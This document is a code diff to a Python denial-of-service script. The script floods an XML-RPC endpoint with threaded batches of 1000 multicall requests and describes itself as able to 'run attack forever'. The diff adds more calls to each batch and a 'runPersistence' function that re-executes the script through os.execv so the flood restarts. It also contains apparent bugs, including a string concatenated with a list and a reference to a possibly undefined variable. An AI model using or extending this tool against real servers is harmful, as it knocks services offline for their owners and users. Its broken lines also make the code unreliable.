@@ -2,6 +2,7 @@ import xmlrpc.client
 import sys
 import ssl
 import http
+import os
 from threading import Thread
 
 endpoint = ''
@@ -12,6 +13,7 @@ def artillery ():
 	multicall = xmlrpc.client.MultiCall(client)
 	for _ in range(1000):
 		multicall.system.listMethods()
+		multicall.system.getCapabilities()
 	try:
 		for i, r in enumerate(multicall()):
 			print("Request sent, Response received.. Its still online")
@@ -23,7 +25,7 @@ def artillery ():
 		print('SSLCertVerificationError: SSL Certificate failure')
 		
 	except xmlrpc.client.Fault as err:
-		print('FaultCode: Error with communication... is the xmlrpc server down?')
+		print('FaultCode: ', r)
 	
 	except http.client.RemoteDisconnected as httperr:
 		print('RemoteDisconnectError: Remote disconnect from the server')
@@ -33,6 +35,10 @@ def artillery ():
 		
 	except ConnectionResetError as connreseterr:
 		print('ConnResetError: Remote disconnect from the server')
+		
+def runPersistence ():
+	print("Restarting script " + ['python'] + sys.argv)
+	os.execv(sys.executable, ['python'] + sys.argv)
 
 if __name__ == '__main__':
 	params = sys.argv
@@ -45,7 +51,7 @@ if __name__ == '__main__':
 	print('Run attack forever: ' + str(runForever))
 	
 	if (runForever):
-		while(runForever):
+		if(runForever):
 			t = [0] * (threadCount + 1)
 
 			for i in range(threadCount):
@@ -54,6 +60,9 @@ if __name__ == '__main__':
 				
 			for i in range(threadCount):
 				t[i].join()
+				
+			runPersistence()
+			
 	else:
 		t = [0] * (threadCount + 1)
 		for i in range(threadCount):
